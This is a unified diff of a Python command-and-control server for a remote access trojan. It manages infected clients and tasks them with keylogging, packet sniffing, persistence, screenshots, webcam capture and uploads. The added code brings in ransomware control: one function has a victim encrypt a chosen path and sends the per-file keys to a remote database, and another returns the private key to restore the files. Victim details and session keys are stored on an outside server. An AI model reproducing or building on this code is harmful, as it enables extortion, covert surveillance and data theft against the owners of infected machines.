@@ -45,8 +45,9 @@ import threading
 import subprocess
 import SocketServer
 
-from Crypto.Cipher import AES
+from Crypto.PublicKey import RSA
 from Crypto.Hash import HMAC, SHA256
+from Crypto.Cipher import AES, PKCS1_OAEP
 from Crypto.Util.number import long_to_bytes, bytes_to_long
 
 
@@ -80,22 +81,26 @@ a8P     88 a8"    `Y88 a8"    `Y88 88P'    "8a 88 ""     `Y8 88P'   `"8a MM88MMM
 __PORT__    = 1337  
 
 
-# default database interaction targets
-___DB___    = {
-    'domain': 'https://snapchat.sex/',
-    'pages': {
-        'results'   : 'result.php?id={}',
-        'query'     : 'query.php',
-        'session'   : 'session.php'
-        },
-    'session_key': None
-    }
+# types of tasks that will be saved to the database
+tasks   = 
 
-# enable/disable debugging output
-__DEBUG__   = True
+# default database directory tree
+___DB___    = {
+    'domain': 'https://example.com/',
+    'pages' : {
+        'query'     : 'query.php',
+        'session'   : 'session.php',
+        'ransom'    : 'ransom.php'
+    },
+    'session_key': None,
+    'tasks': ['keylogger','packetsniff','persistence','ransom','screenshot','webcam','upload']
+}
+
+# enable debugging mode for local network only
+__DEBUG__   = False
 
 # comment/uncomment the following line to disable/enable color 
-colorama.init(autoreset=False)
+colorama.init()
 
 
 
@@ -103,7 +108,6 @@ class ServerThread(threading.Thread):
 
     global threads
 
-    default_tasks = ['keylogger','packetsniff','persistence','ransom','screenshot','webcam']
     
     def __init__(self, port, **kwargs):
         super(ServerThread, self).__init__()
@@ -123,6 +127,8 @@ class ServerThread(threading.Thread):
             'kill'          :   self.remove_client,
             'quit'          :   self.quit_server,
             'query'         :   self.query_database,
+            'ransom'        :   self.ransom_client,
+            'restore'       :   self.restore_client,
             'results'       :   self.show_task_results,
             'select'        :   self.select_client,
 	    'sendall'	    :   self.sendall_clients,
@@ -134,7 +140,7 @@ class ServerThread(threading.Thread):
             '?'             :   self.usage
             }
         self.db             = globals().get('___DB___')
-        self._rand_color    = lambda: getattr(colorama.Fore, random.choice(['RED','BLUE','CYAN','GREEN','YELLOW','WHITE','MAGENTA']))
+        self._rand_color    = lambda: getattr(colorama.Fore, random.choice(['RED','CYAN','GREEN','YELLOW','WHITE','MAGENTA']))
         self._text_color    = self._rand_color()
         self._text_style    = colorama.Style.DIM
         self._prompt_color  = colorama.Fore.RESET
@@ -291,8 +297,8 @@ class ServerThread(threading.Thread):
             p  = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AACAA68FFFFFFFFFFFFFFFF
             a  = bytes_to_long(os.urandom(32))
             xA = pow(g, a, p)
-            xA = hex(xA).strip('L')
-            xB = long(requests.post(self.db['domain'] + self.db['pages']['session'], data={'public_key': xA, 'ip': 'localhost'}).content)
+            xB = requests.post(self.db['domain'] + self.db['pages']['session'], data={'public_key': hex(xA).strip('L'), 'id': '0000000000000000000000000000000000000000000000000000000000000000'}).content
+            xB = long(xB)
             x  = pow(xB, a, p)
             return self._obfuscate(SHA256.new(bytes(x).strip('L')).hexdigest())
         except Exception as e:
@@ -304,10 +310,10 @@ class ServerThread(threading.Thread):
         elif self.current_client:
             client = self.current_client
         else:
-            self._error("Failed to {} data '{}' - invalid Client ID: {}".format(self.encrypt.func_name, data, client_id))
+            self._error("Invalid Client ID: {}".format(client_id))
             self._return()
         try:
-            return self._encrypt_aes(data, self._deobfuscate(client.session_key)) if len(self._deobfuscate(client.session_key)) == 64 else self._encrypt_xor(data, self._deobfuscate(client.session_key))
+            return getattr(self, '_encrypt_{}'.format(client.info.get('encryption')))(bytes(data), self._deobfuscate(client.session_key))
         except Exception as e:
             self._error(str(e))
 
@@ -317,10 +323,10 @@ class ServerThread(threading.Thread):
         elif self.current_client:
             client = self.current_client
         else:
-            self._error("Failed to {} data '{}' - invalid Client ID: {}".format(self.decrypt.func_name, data, client_id))
+            self._error("Invalid Client ID: {}".format(client_id))
             self._return()
         try:
-            return self._decrypt_aes(data, self._deobfuscate(client.session_key)) if len(self._deobfuscate(client.session_key)) == 64 else self._decrypt_xor(data, self._deobfuscate(client.session_key))        
+            return getattr(self, '_decrypt_{}'.format(client.info.get('encryption')))(bytes(data), self._deobfuscate(client.session_key))
         except Exception as e:
             self._error(str(e))
 
@@ -334,7 +340,7 @@ class ServerThread(threading.Thread):
             self._return()
         try:
             task_id = self.new_task_id(command, client_id)
-            task    = {'id': task_id, 'client': client.id, 'command': command}
+            task    = {'id': task_id, 'client_id': client.info['id'], 'session_id': client.session, 'task': command}
             data    = self.encrypt(json.dumps(task), client.name) + '\n'
             client.connection.sendall(data)
         except Exception as e:
@@ -349,15 +355,24 @@ class ServerThread(threading.Thread):
             self._error("Invalid Client ID: {}".format(client_id))
             self._return()
         try:
-            buf     = ''
+            buf = ''
             while '\n' not in buf:
                 try:
                     buf += client.connection.recv(4096)
                 except: break
-            if len(buf):
-                data = self.decrypt(buf, client.name)
-                return json.loads(data)
-            return
+            if buf and len(bytes(buf)):
+                try:
+                    data = self.decrypt(buf, client.name)
+                    try:
+                        return json.loads(data)
+                    except:
+                        return data
+                except:
+                    return buf
+            else:
+                self.remove_client(client.name)
+                self.lock.set()
+                self._return()
         except Exception as e:
             self._error("{} returned error: {}".format(self.recv_client.func_name, str(e)))
 
@@ -374,7 +389,7 @@ class ServerThread(threading.Thread):
                 self.current_client.lock.clear()
             client = self.clients[int(client_id)]
             self.current_client = client
-            print(colorama.Fore.CYAN + colorama.Style.BRIGHT + "\n\n\t[+] " + colorama.Fore.RESET + colorama.Style.DIM + "Client {} selected".format(client.name, client.addr[0]) + self._text_color + self._text_style)
+            print(colorama.Fore.CYAN + colorama.Style.BRIGHT + "\n\n\t[+] " + colorama.Fore.RESET + colorama.Style.DIM + "Client {} selected".format(client.name, client.address[0]) + self._text_color + self._text_style)
             print(self._text_color + self._text_style)
             self.current_client.lock.set()
             return self.current_client.run()
@@ -405,7 +420,12 @@ class ServerThread(threading.Thread):
                 client = self.clients[int(client_id)]
                 client.lock.clear()
                 self.send_client('kill', client_id)
-                client.connection.close()
+                try:
+                    client.connection.close()
+                except: pass
+                try:
+                    client.connection.shutdown()
+                except: pass
                 _ = self.clients.pop(int(client_id), None)
                 del _
                 if not self.current_client:
@@ -432,9 +452,9 @@ class ServerThread(threading.Thread):
 
 
     def list_clients(self):
-        print(self._text_color + colorama.Style.BRIGHT + '\n{:>3}'.format('#') + colorama.Fore.YELLOW + colorama.Style.DIM + ' | ' + colorama.Style.BRIGHT + self._text_color + '{:>64}'.format('Client ID') + colorama.Style.DIM + colorama.Fore.YELLOW + ' | ' + colorama.Style.BRIGHT + self._text_color + '{:>16}'.format('Address') + colorama.Style.DIM + colorama.Fore.YELLOW  + '\n-----------------------------------------------------------------------------------------')
+        print(self._text_color + colorama.Style.BRIGHT + '\n{:>3}'.format('#') + colorama.Fore.YELLOW + colorama.Style.DIM + ' | ' + colorama.Style.BRIGHT + self._text_color + '{:>64}'.format('Session ID') + colorama.Style.DIM + colorama.Fore.YELLOW + ' | ' + colorama.Style.BRIGHT + self._text_color + '{:>16}'.format('IP Address') + colorama.Style.DIM + colorama.Fore.YELLOW  + '\n-----------------------------------------------------------------------------------------')
         for k, v in self.clients.items():
-            print(self._text_color + colorama.Style.BRIGHT + '{:>3}'.format(k) + colorama.Fore.YELLOW  + colorama.Style.DIM + ' | ' + colorama.Style.BRIGHT + self._text_color + '{:>33}'.format(v.id) + colorama.Fore.YELLOW  + colorama.Style.DIM + ' | ' + colorama.Style.BRIGHT + self._text_color + '{:>16}'.format(v.addr[0]))
+            print(self._text_color + colorama.Style.BRIGHT + '{:>3}'.format(k) + colorama.Fore.YELLOW  + colorama.Style.DIM + ' | ' + colorama.Style.BRIGHT + self._text_color + '{:>33}'.format(v.session) + colorama.Fore.YELLOW  + colorama.Style.DIM + ' | ' + colorama.Style.BRIGHT + self._text_color + '{:>16}'.format(v.address[0]))
         print('\n')
         self._return()
           
@@ -554,7 +574,52 @@ class ServerThread(threading.Thread):
                 self.send_client("webcam %s" % args, client.name)
         except Exception as e:
             self._error("webcam stream failed with error: {}".format(str(e)))
-    
+
+
+    def ransom_client(self, path):
+        if self.current_client:
+            client = self.current_client
+            port = random.randint(10000, 65535)
+            sock = socket.socket()
+            sock.bind(('0.0.0.0', port))
+            sock.listen(1)
+            self.send_client("ransom {} {}".format(path, port), client.name)
+            c, a = sock.accept()
+            c.settimeout(5.0)
+            while True:
+                buff = ''
+                while '\n' not in buff:
+                    try:
+                        buff += c.recv(2048)
+                    except socket.timeout:
+                        break
+                if buff and len(str(buff)) and bytes('0' * 64) not in buff:
+                    data = self._decrypt_aes(buff, self._deobfuscate(client.session_key))
+                    task = json.loads(data)
+                    save = self.query_database("INSERT INTO ransom (session_id, file, key) VALUES ({})".format("'{}', ".format(i) for i in [task['session_id'], task['data']['file'], task['data']['key']]), display=False)
+                else:
+                    break
+        else:
+            self._error("No client selected")
+            self._return()
+
+    def restore_client(self, *args):
+        if self.current_client:
+            client = self.current_client
+            try:
+                result = self.query_database("SELECT * FROM sessions WHERE id='{}'".format(client.session), display=False)
+                if result:
+                    result = json.loads(result)
+                    private_key = result['private_key']
+                    self.send_client(private_key, client.name)
+                else:
+                    return "No private key found for Session ID '{}'".format(client.session)
+            except Exception as e:
+                self._error("{} returned error: {}".format(self.restore_client.func_name, str(e)))
+        else:
+            self._error("No client selected")
+            self._return()
+
     def new_task_id(self, command, client_id=None):
         if str(client_id).isdigit() and int(client_id) in self.clients:
             client = self.clients[int(client_id)]
@@ -564,25 +629,26 @@ class ServerThread(threading.Thread):
             self._error("Invalid Client ID: {}".format(client_id))
             self._return()
         try:
-            return SHA256.new(bytes(client.id) + bytes(command) + bytes(time.time())).hexdigest()
+            return SHA256.new(bytes(client.info['id']) + bytes(command) + bytes(time.time())).hexdigest()
         except Exception as e:
-            self._error(str(e))
+            self._error("{} returned error: {}".format(self.new_task_id.func_name, str(e)))
 
     def show_task_results(self, client_id=None):
         if str(client_id).isdigit() and int(client_id) in self.clients:
-            return self.query_database("SELECT * FROM tasks WHERE client='{}'".format(self.clients[int(client_id)].id).replace("Array\n(", "").replace("\n)", ""))
+            client = self.clients[int(client_id)]
+            return self.query_database("SELECT * FROM tasks WHERE session_id='{}'".format(client.session).replace("Array\n(", "").replace("\n)", ""))
         elif self.current_client:
-            return self.query_database("SELECT * FROM tasks WHERE client='{}'".format(self.current_client.id).replace("Array\n(", "").replace("\n)", ""))
+            client = self.current_client
+            return self.query_database("SELECT * FROM tasks WHERE session_id='{}'".format(self.current_client.session).replace("Array\n(", "").replace("\n)", ""))
         else:
-            return '\n'.join([self.query_database("SELECT * FROM tasks WHERE client='{}'".format(client.id).replace("Array\n(", "").replace("\n)", "")) for client in self.get_clients()])
-
+            return "No client selected"
+    
     def save_task_results(self, task):
-        if type(task) is dict:
-            cmd, _, action = bytes(task.get('command')).partition(' ')
-            if cmd in self.default_tasks:
+        if type(task) is dict and task.get('id') != '0000000000000000000000000000000000000000000000000000000000000000':
+            cmd, _, action = bytes(task.get('task')).partition(' ')
+            if cmd in self.db['tasks']:
                 try:
-                    query   = "INSERT INTO tasks (task_id, client, task, data) VALUES ({})".format(', '.join("'{}'".format(i) for i in (task['id'], task['client'], task['command'], task['data'])))
-                    output  = self.query_database(query)
+                    query   = self.query_database("INSERT INTO tasks (id, client_id, session_id, task, data) VALUES ({})".format(', '.join("'{}'".format(i) for i in (task['id'], task['client_id'], task['session_id'], task['task'], task['data']))), display=False)
                 except Exception as e:
                     self._error("{} returned error: {}".format(self.save_task_results.func_name, str(e)))
         else:
@@ -591,32 +657,44 @@ class ServerThread(threading.Thread):
 
     def get_current_session(self):
         try:
-            return self._deobfuscate(self.db['session_key']) if self.db.get('session_key') else "None"
+            if self.db.get('session_key'):
+                return self._deobfuscate(self.db['session_key'])
+            else:
+                return "No session key found"
         except Exception as e:
             self._error("{} returned error: {}".format(self.get_current_session.func_name, str(e)))
 
-    def query_database(self, query):
-        key     = self.db['session_key'] if self.db.get('session_key') else self.diffiehellman()
-        query   = self._encrypt_aes(query, self._deobfuscate(key))
-        data    = requests.post(self.db['domain'] + self.db['pages']['query'], data={'query': query}).content
-        if data:
-            output  = self._decrypt_aes(data, self._deobfuscate(key))
-            if output:
-                if '\n' in output:
-                    for row in output.split('\n'):
-                        try:
-                            self._print(row)
-                        except: break
-                else:
-                    self._print(output)
-
+    def query_database(self, query, display=True):
+        if self.db.get('session_key'):
+            key     = self.db['session_key']
+            query   = self._encrypt_aes(query, self._deobfuscate(key))
+            data    = requests.post(self.db['domain'] + self.db['pages']['query'], data={'query': query}).content
+            if data:
+                output  = self._decrypt_aes(data, self._deobfuscate(key))
+                if output:
+                    if not display:
+                        return output
+                    else:
+                        if '\n' in output:
+                            for row in output.split('\n'):
+                                try:
+                                    self._print(row)
+                                except: break
+                        else:
+                            try:
+                                self._print(output)
+                            except:
+                                print(bytes(output))
+        else:
+            self._error("No session key found")
+    
     def connection_handler(self):
         while True:
-            connection, addr   = self.s.accept()
-            name               = self.count
-            client             = ClientHandler(connection, addr, name)
-            self.clients[name] = client
-            print(colorama.Fore.GREEN + colorama.Style.BRIGHT + "\n\n\t[+] " + colorama.Fore.RESET + colorama.Style.DIM + "Client {} - new connection from {}\n".format(client.name, client.addr[0]) + self._text_color + self._text_style)
+            connection, addr    = self.s.accept()
+            private             = RSA.generate(2048)
+            public              = private.publickey()
+            client              = ClientHandler(connection, address=addr, name=self.count, private_key=private, public_key=public)
+            self.clients[self.count]  = client
             self.count  += 1
             client.start()
             self._return()
@@ -652,7 +730,6 @@ class ServerThread(threading.Thread):
         print('Server shutting down')
         exit()
 
-
     def start(self):
         threads[self.connection_handler.func_name] = threading.Thread(target=self.connection_handler, name=time.time())
         threads[self.run.func_name] = threading.Thread(target=self.run, name=time.time())
@@ -665,16 +742,18 @@ class ClientHandler(threading.Thread):
 
     global threads
 
-    def __init__(self, connection, addr, name):
+    def __init__(self, connection, **kwargs):
         super(ClientHandler, self).__init__()
         self.prompt         = None
         self.connection     = connection
-        self.addr           = addr
-        self.name           = name
         self.lock           = threading.Event()
+        self.name           = kwargs.get('name')
+        self.address        = kwargs.get('address')
+        self.public_key     = kwargs.get('public_key')
+        self.private_key    = kwargs.get('private_key')
         self.session_key    = self.diffiehellman()
         self.info           = self._info()
-        self.id             = self._register()
+        self.session        = self._session_id()
         self.connection.setblocking(True)
         
     def _prompt(self, data):
@@ -690,29 +769,37 @@ class ClientHandler(threading.Thread):
         try:
             data = threads['server']._decrypt_aes(buf.rstrip(), threads['server']._deobfuscate(self.session_key))
         except Exception as e1:
+            self._error("AES decryption error: {}".format(str(e1)))
             try:
                 data = threads['server']._decrypt_xor(buf.rstrip(), threads['server']._deobfuscate(self.session_key))
             except Exception as e2:
-                self._error("Encryption failed\nAES error: {}\nXOR error: {}".format(str(e1, e2)))
-                return
+                self._error("XOR decryption error: {}".format(str(e2)))
         try:
-            return json.loads(data.rstrip())
+            data  = json.loads(data.rstrip())
+            exist = threads['server'].query_database("SELECT * FROM clients WHERE id='{}'".format(data['id']), display=False)            
+            if not exist or len(str(exist)) == 0:
+                query = threads['server'].query_database("INSERT INTO clients ({}) VALUES ({})".format(', '.join(data.keys()), ', '.join(["'{}'".format(v) for v in data.values()])), display=False)
+            else:
+                query = threads['server'].query_database("UPDATE clients SET {} WHERE id='{}'".format([", ".join(["{}='{}'".format(k, v) for k, v in data.items()])], data['id']), display=False)
+            return data
         except Exception as e3:
             self._error("{} returned error: {}".format(self._info.func_name, str(e3)))
 
-    def _register(self):
-        try:
-            client_hash = SHA256.new(bytes(self.info['ip']) + bytes(self.info['mac'])).hexdigest()
-            try:
-                threads['server'].query_database("INSERT INTO clients ({}) VALUES ({})".format(', '.join([k for k in self.info.keys() + ['hash','session_key']]), ', '.join(["'{}'".format(v) for v in self.info.values() + [client_hash, self.session_key]])))
-                _ = requests.post(threads['server'].db['domain'] + threads['server'].db['pages']['session'], data={'ip': self.info['ip']})
-                data = threads['server']._encrypt_aes(client_hash, threads['server']._deobfuscate(self.session_key)) if 'AES' in self.info['encryption'] else threads['server']._encrypt_xor(uid, threads['server']._deobfuscate(self.session_key))
-                self.connection.sendall(data + '\n')
-            except Exception as e:
-                self._error(str(e))
-            return client_hash
-        except Exception as e2:
-            self._error("Client registration failed: {}".format(str(e2)))
+    def _session_id(self):
+        query       = threads['server'].query_database("INSERT INTO sessions ({}) VALUES ({})".format(', '.join(['client_id','session_key','private_key','public_key']), ', '.join(["'{}'".format(v) for v in [self.info['id'], self.session_key, self.private_key.exportKey(), self.public_key.exportKey()]])), display=False)
+        session_id  = requests.post(threads['server'].db['domain'] + threads['server'].db['pages']['session'], data={'id': self.info['id']}).content
+        print(colorama.Fore.GREEN + colorama.Style.BRIGHT + "\n\n [+] " + colorama.Fore.RESET + "New connection" + colorama.Style.DIM + "\n{:>14}\t\t{}\n{:>15} {:>72}\n".format("Client ID", self.name, "Session ID", session_id) + threads['server']._text_color + threads['server']._text_style)
+        ciphertext  = getattr(threads['server'], '_encrypt_{}'.format(self.info.get('encryption')))(session_id, threads['server']._deobfuscate(self.session_key))
+        self.connection.sendall(ciphertext + '\n')
+        ciphertext  = ""
+        while "\n" not in ciphertext:
+            ciphertext += self.connection.recv(1024)
+        plaintext   = getattr(threads['server'], '_decrypt_{}'.format(self.info.get('encryption')))(ciphertext.rstrip(), threads['server']._deobfuscate(self.session_key))
+        request     = json.loads(plaintext)
+        if request.get('request') == 'public_key':
+            response = getattr(threads['server'], '_encrypt_{}'.format(self.info.get('encryption')))(self.public_key.exportKey(), threads['server']._deobfuscate(self.session_key))
+            self.connection.sendall(response + '\n')
+        return session_id
 
     def diffiehellman(self):
         try:
@@ -726,7 +813,7 @@ class ClientHandler(threading.Thread):
             y  = SHA256.new(long_to_bytes(x)).hexdigest()
             return threads['server']._obfuscate(y)
         except Exception as e:
-            self._error("Diffie-Hellman transactionless key-agreement failed with error: {}".format(str(e)))
+            self._error("Diffie-Hellman transactionless key-agreement failed with error: {}\nRetrying...".format(str(e)))
             time.sleep(1)
             return self.diffiehellman()
 
@@ -738,7 +825,7 @@ class ClientHandler(threading.Thread):
                 self.lock.wait()
                 task = self.prompt if self.prompt else threads['server'].recv_client(self.name)
                 if type(task) is dict:
-                    if 'prompt' == task.get('command'):
+                    if 'prompt' in task.get('task'):
                         self.prompt     = task.get('data')
                         command         = self._prompt(bytes(self.prompt).format(self.name))
                         cmd, _, action  = bytes(command).partition(' ')
@@ -749,7 +836,7 @@ class ClientHandler(threading.Thread):
                                 threads['server'].save_task_results(task)
                             continue
                         else:
-                            threads['server'].send_client(command, self.name)
+                            threads['server'].send_client(command, self.name)                        
                     else:
                         if task.get('data'):
                             threads['server']._print(task['data'])
@@ -769,8 +856,8 @@ if __name__ == '__main__':
     port    = int(__PORT__)
     threads = {}
     threads['server'] = ServerThread(port)
-    os.system('cls' if os.name is 'nt' else 'clear')
+#    os.system('cls' if os.name is 'nt' else 'clear')
     print(threads['server']._rand_color() + BANNER + colorama.Fore.WHITE)
-    print(colorama.Fore.YELLOW + "[?] " + colorama.Fore.WHITE + "-h/--help for usage information\n\n\n")
-    threads['server'].start()   
+    print(colorama.Fore.YELLOW + "[?] " + colorama.Fore.RESET + "'-h' or '--help' in server prompt for server usage help\n\n" + colorama.Fore.YELLOW + "[?] " + colorama.Fore.RESET + "'show help' in client prompt for client usage help\n\n")
+    threads['server'].start()
  
